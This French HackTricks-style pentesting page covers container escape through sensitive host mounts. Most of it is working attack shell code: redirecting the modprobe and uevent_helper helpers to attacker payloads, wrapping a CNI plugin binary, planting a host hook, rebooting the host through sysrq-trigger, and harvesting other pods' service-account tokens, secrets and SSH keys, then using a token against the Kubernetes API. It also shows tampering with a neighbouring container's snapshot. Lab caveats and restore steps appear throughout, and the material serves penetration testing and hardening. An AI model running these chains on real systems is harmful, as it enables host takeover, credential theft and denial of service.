# Montages sensibles de l’hôte

{{#include ../../../banners/hacktricks-training.md}}

## Vue d’ensemble

Les montages de l’hôte constituent l’une des surfaces pratiques les plus importantes pour l’évasion de container, car ils réduisent souvent à néant l’isolation soigneusement mise en place entre les processus en rétablissant une visibilité directe sur les ressources de l’hôte. Les cas dangereux ne se limitent pas à `/`. Les bind mounts de `/proc`, `/sys`, `/var`, des runtime sockets, de l’état géré par kubelet ou des chemins liés aux devices peuvent exposer des contrôles du kernel, des credentials, les filesystems de containers voisins et des interfaces de gestion du runtime.

Cette page existe séparément des pages consacrées à chaque mécanisme de protection, car le modèle d’abus est transversal. Un montage d’hôte accessible en écriture est dangereux en partie à cause des mount namespaces, en partie à cause des user namespaces, en partie à cause de la couverture d’AppArmor ou de SELinux, et en partie à cause du chemin exact de l’hôte qui a été exposé. Le traiter comme un sujet distinct facilite considérablement l’analyse de la surface d’attaque.

## Exposition de `/proc`

procfs contient à la fois des informations ordinaires sur les processus et des interfaces de contrôle du kernel à fort impact. Un bind mount tel que `-v /proc:/host/proc`, ou une vue du container exposant des entrées proc accessibles en écriture de manière inattendue, peut donc entraîner une divulgation d’informations, un déni de service ou une exécution directe de code sur l’hôte.

Les chemins procfs à forte valeur comprennent notamment :

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (en particulier `register` et `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abus

Commencez par vérifier quelles entrées procfs à forte valeur sont visibles ou accessibles en écriture :
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sys/fs/binfmt_misc/status \
/proc/sys/fs/binfmt_misc/register \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Ces chemins sont intéressants pour différentes raisons. `core_pattern`, `modprobe` et `binfmt_misc` peuvent devenir des chemins d'exécution de code sur l'hôte lorsqu'ils sont accessibles en écriture. `kallsyms`, `kmsg`, `kcore` et `config.gz` sont de puissantes sources de reconnaissance pour l'exploitation du kernel. `sched_debug` et `mountinfo` révèlent le contexte des processus, des cgroups et du système de fichiers, ce qui peut aider à reconstituer la disposition de l'hôte depuis l'intérieur du container.

La valeur pratique de chaque chemin est différente, et les traiter comme s'ils avaient tous le même impact complique le triage :

- `/proc/sys/kernel/core_pattern`
S'il est accessible en écriture, il s'agit de l'un des chemins procfs ayant le plus fort impact, car le kernel exécutera un pipe handler après un crash. Un container capable de faire pointer `core_pattern` vers un payload stocké dans son overlay ou dans un chemin monté depuis l'hôte peut souvent obtenir une exécution de code sur l'hôte. Voir également [read-only-paths.md](protections/read-only-paths.md) pour un exemple dédié.
- `/proc/sys/kernel/modprobe`
Ce chemin contrôle le userspace helper utilisé par le kernel lorsqu'il doit invoquer la logique de chargement des modules. S'il est accessible en écriture depuis le container et interprété dans le contexte de l'hôte, il peut devenir une autre primitive d'exécution de code sur l'hôte. Il est particulièrement intéressant lorsqu'il est combiné à un moyen de déclencher le helper path.
- `/proc/sys/vm/panic_on_oom`
Il ne s'agit généralement pas d'une primitive d'escape propre, mais ce chemin peut transformer une pression mémoire en denial of service à l'échelle de l'hôte en convertissant les conditions OOM en comportement de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Si l'interface d'enregistrement est accessible en écriture, l'attaquant peut enregistrer un handler pour une valeur magic choisie et obtenir une exécution dans le contexte de l'hôte lorsqu'un fichier correspondant est exécuté.
- `/proc/config.gz`
Utile pour le triage des kernel exploits. Il aide à déterminer quels sous-systèmes, mitigations et fonctionnalités optionnelles du kernel sont activés sans nécessiter les métadonnées des packages de l'hôte.
- `/proc/sysrq-trigger`
Il s'agit principalement d'un chemin de denial of service, mais il est très sérieux. Il peut redémarrer, provoquer un kernel panic ou perturber immédiatement l'hôte d'une autre manière.
- `/proc/kmsg`
Révèle les messages du ring buffer du kernel. Utile pour le fingerprinting de l'hôte, l'analyse des crashs et, dans certains environnements, pour le leak d'informations utiles à l'exploitation du kernel.
- `/proc/kallsyms`
Précieux lorsqu'il est lisible, car il expose les informations sur les symboles exportés du kernel et peut aider à contourner les hypothèses liées à l'address randomization lors du développement d'un kernel exploit.
- `/proc/[pid]/mem`
Il s'agit d'une interface directe vers la mémoire d'un processus. Si le processus cible est accessible avec les conditions nécessaires de type ptrace, elle peut permettre de lire ou de modifier la mémoire d'un autre processus. L'impact réel dépend fortement des credentials, de `hidepid`, de Yama et des restrictions ptrace ; il s'agit donc d'un chemin puissant, mais conditionnel.
- `/proc/kcore`
Expose une vue de la mémoire système de type core image. Le fichier est énorme et difficile à exploiter, mais s'il est réellement lisible, cela indique une surface mémoire de l'hôte gravement exposée.
- `/dev/kmem` et `/dev/mem`
Il s'agit historiquement d'interfaces **device** d'accès à la mémoire brute ayant un fort impact, et non de fichiers procfs. Sur de nombreux systèmes modernes, elles sont absentes ou fortement restreintes, mais un container capable d'ouvrir une copie montée depuis l'hôte doit considérer cette exposition comme critique. Examinez-les avec les autres mounts `/dev` sensibles plutôt que de rechercher les chemins inexistants `/proc/kmem` ou `/proc/mem`.
- `/proc/sched_debug`
Leak des informations sur l'ordonnancement et les tâches, ce qui peut exposer les identités des processus de l'hôte même lorsque les autres vues des processus semblent plus propres que prévu.
- `/proc/[pid]/mountinfo`
Très utile pour reconstituer l'emplacement réel du container sur l'hôte, déterminer quels chemins sont soutenus par un overlay et vérifier si un mount accessible en écriture correspond au contenu de l'hôte ou uniquement à la couche du container.

Si `/proc/[pid]/mountinfo` ou les détails de l'overlay sont lisibles, utilisez-les pour retrouver le chemin hôte du système de fichiers du container :
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
### Exemple : préparation d'un chemin d'helper `modprobe`

Si `/proc/sys/kernel/modprobe` est accessible en écriture depuis le container et que le chemin de l'helper est interprété dans le contexte de l'hôte, il peut être redirigé vers un payload contrôlé par l'attaquant. Le répertoire upper de l'overlay doit être résolu depuis l'hôte, et la sortie de preuve doit être écrite dans cette même couche du container visible depuis l'hôte si le container ne monte pas également le `/tmp` de l'hôte :
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```
Le déclencheur exact dépend de la cible et du comportement du kernel, et n’est volontairement pas deviné. Restaurez la valeur d’origine avant de quitter le lab. Le point important est qu’un chemin d’helper accessible en écriture peut rediriger une future invocation d’un helper du kernel vers du contenu contrôlé par l’attaquant dans un chemin de l’hôte. Un `upperdir` overlay manquant, un chemin que l’hôte ne peut pas résoudre, un montage sysctl en lecture seule ou un kernel qui n’invoque jamais l’helper sélectionné interrompra cette chaîne.

### Exemple complet : Recon du kernel avec `kallsyms`, `kmsg` et `config.gz`

Si l’objectif est l’évaluation de l’exploitabilité plutôt qu’un escape immédiat :
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Ces commandes permettent de déterminer si des informations utiles sur les symboles sont visibles, si les messages récents du kernel révèlent un état intéressant et quelles fonctionnalités ou mitigations du kernel sont compilées. L’impact n’est généralement pas un escape direct, mais cela peut considérablement accélérer le triage d’une vulnérabilité du kernel.

### Exemple complet : redémarrage de l’hôte via SysRq

Si `/proc/sysrq-trigger` est accessible en écriture et atteint la vue de l’hôte :
```bash
echo b > /proc/sysrq-trigger
```
L’effet est un redémarrage immédiat de l’hôte. Ce n’est pas un exemple subtil, mais il démontre clairement que l’exposition de procfs peut être bien plus grave qu’une simple divulgation d’informations.

## Exposition de `/sys`

sysfs expose de grandes quantités d’informations sur l’état du kernel et des périphériques. Certains chemins sysfs sont principalement utiles pour le fingerprinting, tandis que d’autres peuvent affecter l’exécution d’helpers, le comportement des périphériques, la configuration des security modules ou l’état du firmware.

Les chemins sysfs à forte valeur comprennent :

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ces chemins sont importants pour différentes raisons. `/sys/class/thermal` peut influencer le comportement de la gestion thermique et donc la stabilité de l’hôte dans les environnements mal exposés. `/sys/kernel/vmcoreinfo` peut leak des informations sur les crash dumps et la disposition du kernel, ce qui facilite le fingerprinting bas niveau de l’hôte. `/sys/kernel/security` est l’interface `securityfs` utilisée par les Linux Security Modules ; un accès inattendu peut donc exposer ou modifier l’état lié au MAC. Les chemins des variables EFI peuvent affecter les paramètres de boot pris en charge par le firmware, ce qui les rend bien plus graves que de simples fichiers de configuration. `debugfs`, sous `/sys/kernel/debug`, est particulièrement dangereux, car il s’agit volontairement d’une interface destinée aux développeurs, avec beaucoup moins de garanties de sécurité que les API du kernel destinées à la production.

Chaque entrée sysfs de cette liste dépend **du kernel, de la configuration et du matériel**. Les nœuds virtualisés actuels omettent souvent entièrement `uevent_helper`, les variables EFI et les entrées des périphériques thermiques. Consignez un chemin absent comme un prérequis négatif au lieu de supposer qu’un exemple provenant d’un autre kernel s’applique.

Les commandes utiles pour examiner ces chemins sont :
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Ce qui rend ces commandes intéressantes :

- `/sys/kernel/security` peut révéler si AppArmor, SELinux ou une autre surface LSM est visible d’une manière qui aurait dû rester limitée à l’hôte.
- `/sys/kernel/debug` est souvent la découverte la plus préoccupante de ce groupe. Si `debugfs` est monté et accessible en lecture ou en écriture, attendez-vous à une large surface orientée vers le kernel, dont le risque exact dépend des nœuds de debug activés.
- L’exposition des variables EFI est moins courante, mais son impact est élevé, car elle touche des paramètres pris en charge par le firmware plutôt que de simples fichiers d’exécution.
- `/sys/class/thermal` concerne principalement la stabilité de l’hôte et les interactions avec le matériel, et non un escape propre de type shell.
- `/sys/kernel/vmcoreinfo` sert principalement à identifier l’hôte et à analyser les crashs, ce qui est utile pour comprendre l’état du kernel à bas niveau.

### Exemple complet : `uevent_helper`

`/sys/kernel/uevent_helper` dépend du kernel et de la configuration, et est absent de nombreux systèmes actuels. S’il existe, est accessible en écriture et qu’un déclencheur `uevent` utilisable est disponible, le kernel peut exécuter un helper contrôlé par l’attaquant. La sortie de preuve doit utiliser un chemin visible depuis les vues de l’hôte et du container :
```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
echo "No writable, pre-approved uevent trigger was found" >&2
exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```
La raison pour laquelle cela fonctionne est que le chemin du helper est interprété du point de vue de l’hôte. Une fois déclenché, le helper s’exécute dans le contexte de l’hôte plutôt qu’à l’intérieur du container actuel. `/sys/class/mem/null/uevent` constitue un déclencheur concret sur les kernels qui l’exposent ; d’autres devices peuvent exposer leurs propres fichiers `uevent`, mais n’en sélectionnez pas un aveuglément sur du matériel réel. Restaurez la valeur d’origine avant de quitter le lab. Ne signalez pas cette technique comme disponible lorsque le fichier du helper ou un déclencheur contrôlé est absent.

## Exposition de `/var`

Monter le `/var` de l’hôte dans un container est souvent sous-estimé, car cela ne semble pas aussi spectaculaire que le montage de `/`. En pratique, cela peut suffire pour atteindre les runtime sockets, les répertoires de snapshots des containers, les volumes de pods gérés par kubelet, les projected service-account tokens et les systèmes de fichiers des applications voisines. Sur les nodes modernes, `/var` est souvent l’emplacement où se trouve réellement l’état des containers le plus intéressant sur le plan opérationnel.

### Exemple Kubernetes

Un pod avec `hostPath: /var` peut souvent lire les projected tokens des autres pods ainsi que le contenu des snapshots overlay :
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Ces commandes sont utiles, car elles indiquent si le mount n’expose que des données applicatives sans intérêt ou des identifiants de cluster à fort impact. Un service-account token lisible peut immédiatement transformer une exécution de code locale en accès à l’API Kubernetes.

Si le token est présent, validez ce à quoi il peut accéder au lieu de vous arrêter à sa découverte :
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
L’impact peut être bien plus important qu’un simple accès au nœud local. Un token disposant d’un RBAC étendu peut transformer un `/var` monté en compromission de l’ensemble du cluster.

### Exemple Docker et containerd

Sur les hôtes Docker, les données pertinentes se trouvent souvent sous `/var/lib/docker`, tandis que sur les nœuds Kubernetes utilisant containerd, elles peuvent se trouver sous `/var/lib/containerd` ou dans des chemins spécifiques au snapshotter :
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Si le `/var` monté expose le contenu inscriptible d’un snapshot d’un autre workload, l’attaquant peut être en mesure de modifier des fichiers applicatifs, de déposer du contenu web ou de changer des scripts de démarrage sans toucher à la configuration actuelle du conteneur.

Dans un **workload de lab jetable**, le contenu inscriptible d’un snapshot peut démontrer la falsification d’une application, la récupération de secrets ou le mouvement latéral. Faites d’abord correspondre l’ID du conteneur runtime au snapshot exact et ne modifiez jamais un snapshot sans rapport ou de production :
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```
Ces commandes sont utiles, car elles montrent les trois principales familles d’impact des montages de `/var` : la falsification d’applications, la récupération de secrets et le mouvement latéral vers les workloads voisins.

Les écritures directes dans les snapshots contournent la gestion normale de l’état par le runtime et peuvent corrompre le container ou détruire des preuves. La découverte en lecture seule a été reproduite localement avec Docker `overlay2` : un marqueur écrit dans un container jetable voisin est apparu sous `/var/lib/docker/overlay2/<id>/diff/`. Limitez la modification réelle des snapshots à un container jetable créé pour ce test.

## État de Kubelet, plugins et chemins CNI

Un montage de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` est souvent exposé par des DaemonSets privilégiés, des agents CNI, des plugins de nœuds CSI, des opérateurs GPU et des helpers de stockage. Ces montages sont faciles à considérer comme de simples « composants internes du nœud », mais ils se trouvent directement sur le chemin d’exécution des nouveaux pods et contiennent souvent des identifiants Kubelet, des secrets projetés, des sockets d’enregistrement et des binaires exécutables de plugins côté host.

Les cibles à forte valeur comprennent :

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Les commandes de revue utiles sont :
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Pourquoi ces chemins sont importants :

- `/var/lib/kubelet/pki` peut exposer les certificats client du kubelet et d’autres credentials locaux au nœud, qui peuvent parfois être réutilisés contre l’API server ou les endpoints TLS exposés par le kubelet, selon la conception du cluster.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` contient souvent des service-account tokens projetés et des Secrets montés pour les pods voisins sur le même nœud.
- `/var/lib/kubelet/pod-resources/kubelet.sock` constitue principalement une surface de reconnaissance, mais elle est très utile : elle révèle quels pods et containers utilisent actuellement des GPUs, des hugepages, des périphériques SR-IOV et d’autres ressources locales au nœud qui sont limitées.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` et `/var/lib/kubelet/plugins_registry` révèlent quels plugins CSI, DRA et device plugins sont installés, ainsi que les sockets avec lesquels le kubelet est censé communiquer. Si ces répertoires sont accessibles en écriture plutôt qu’en simple lecture, la gravité de la vulnérabilité devient bien plus importante.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` et `/etc/cni/net.d` se trouvent directement sur le chemin de configuration du pod-network. Un accès en écriture constitue souvent une primitive d’exécution différée sur l’hôte plutôt qu’une simple exposition de configuration.<sup>[[2]](#references)</sup>

### Exemple complet : `/opt/cni/bin` accessible en écriture

Si le répertoire host CNI binary est monté en lecture-écriture, remplacer un plugin peut suffire à obtenir une exécution sur l’hôte la prochaine fois que le kubelet crée un pod sandbox sur ce nœud :<sup>[[2]](#references)</sup>
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```
Ce n’est pas aussi immédiat qu’un `docker.sock` monté, mais c’est souvent plus réaliste dans des pods d’infrastructure Kubernetes compromis. Le marqueur est écrit à côté du plugin monté afin que le conteneur puisse le récupérer même sans montage de la racine de l’hôte ou de `host-/tmp`. Le wrapper préserve les arguments d’origine et l’entrée standard, puis l’exemple restaure le binaire d’origine. Le point important est que le binaire modifié est ensuite exécuté par le flux de configuration réseau de l’hôte, et non par le conteneur actuel. Utilisez uniquement un nœud jetable, car un wrapper invalide peut empêcher les nouveaux sandboxes de Pod de recevoir une configuration réseau.

## Sockets du runtime

Les montages sensibles de l’hôte incluent souvent des sockets du runtime plutôt que des répertoires complets. Ils sont si importants qu’ils méritent d’être explicitement rappelés ici :
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Consultez [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) pour découvrir les scénarios d'exploitation complets une fois l'un de ces sockets monté.

Comme premier modèle d'interaction rapide :
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Si l’une de ces tentatives réussit, le chemin entre un « socket monté » et le démarrage d’un conteneur sibling plus privilégié est généralement bien plus court que n’importe quel chemin de kernel breakout.

## Détournement d’une tâche via un chemin hôte accessible en écriture

Un mount hôte accessible en écriture n’a pas besoin d’exposer `/` pour être dangereux. Si le chemin monté contient des scripts, des fichiers de configuration, des hooks, des plugins ou des fichiers consommés ultérieurement par une tâche planifiée ou un service exécuté côté hôte, le conteneur peut être en mesure de modifier ce que l’hôte exécute.

Flux de revue générique :
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Si un fichier accessible en écriture est utilisé par un processus hôte, gardez le payload simple et observable pendant les tests :
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
La partie intéressante est la frontière de confiance : l’écriture s’effectue depuis l’intérieur du container, mais l’exécution a lieu ultérieurement dans le contexte du service host. Cela transforme un `hostPath` ou un bind mount limité en primitive d’exécution de code sur l’host différée.

## CVE liées aux mounts

Les mounts de l’host peuvent également interagir avec les vulnérabilités des runtimes. Parmi les exemples récents importants :

- `CVE-2024-21626` dans `runc`, où un descripteur de fichier de répertoire leaké pouvait placer le répertoire de travail sur le système de fichiers de l’host.
- `CVE-2024-23651`, `CVE-2024-23652` et `CVE-2024-23653` dans BuildKit, où des Dockerfiles, frontends et flux `RUN --mount` malveillants pouvaient réintroduire l’accès aux fichiers de l’host, leur suppression ou des privilèges élevés pendant les builds.
- `CVE-2024-1753` dans les flux de build de Buildah et Podman, où des bind mounts spécialement conçus pendant le build pouvaient exposer `/` en lecture-écriture.
- `CVE-2025-47290` dans `containerd` 2.1.0, où une condition TOCTOU pendant la décompression d’une image pouvait permettre à une image spécialement conçue de modifier le système de fichiers de l’host pendant le pull.

Ces CVE sont importantes ici, car elles montrent que la gestion des mounts ne concerne pas uniquement la configuration de l’opérateur. Le runtime lui-même peut également introduire des conditions d’évasion pilotées par les mounts.

## Vérifications

Utilisez ces commandes pour localiser rapidement les expositions de mounts présentant la plus grande valeur :
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ce qui est intéressant ici :

- La racine de l’hôte, `/proc`, `/sys`, `/var` et les runtime sockets sont tous des éléments hautement prioritaires.
- Les entrées proc/sys accessibles en écriture signifient souvent que le mount expose des contrôles du kernel globaux à l’hôte plutôt qu’une vue sûre du container.
- Les chemins `/var` montés nécessitent une analyse des credentials et des workloads voisins, et pas uniquement une analyse du filesystem.
- Les répertoires d’état du Kubelet et les chemins CNI/plugin méritent la même priorité que les runtime sockets, car ils se trouvent souvent directement sur le chemin de création des pods et de distribution des credentials du node.

## Statut de la validation locale

Les chaînes pratiques de cette page ont été vérifiées sur un node Linux minikube local. La validation a reproduit :

- l’accès en lecture et en écriture via un hostPath temporaire accessible en écriture
- la découverte de tokens ServiceAccount projetés et de Secrets montés via `/var/lib/kubelet/pods`
- l’authentification réussie auprès de l’API Kubernetes avec un token actif récupéré depuis cet état monté du kubelet
- la découverte en lecture seule d’un filesystem `overlay2` Docker voisin via `/var` monté
- la création par l’API Docker d’un container frère avec un bind host en lecture seule via un `docker.sock` monté
- l’exécution différée sur l’hôte via un hook temporaire consommé par l’hôte
- une simulation de CNI-wrapper qui a conservé les arguments, l’entrée standard et l’exécution du plugin d’origine

Le même node exposait `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` et `config.gz`, mais n’exposait pas `uevent_helper`, les variables EFI, les entrées thermiques ni `sched_debug`. Les triggers kernel destructifs n’ont pas été exécutés. Cela confirme que les chaînes impliquant la racine de l’hôte, `/var`, l’état du kubelet, les sockets et les host-consumers sont reproductibles, tandis que les techniques auxiliaires procfs/sysfs doivent rester conditionnelles au kernel exact, au mode de mount, au chemin du payload et au trigger.

## References

- [1] [Fichiers et chemins locaux utilisés par le Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Le container cilium-agent peut accéder à l’hôte via un mount `hostPath`](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
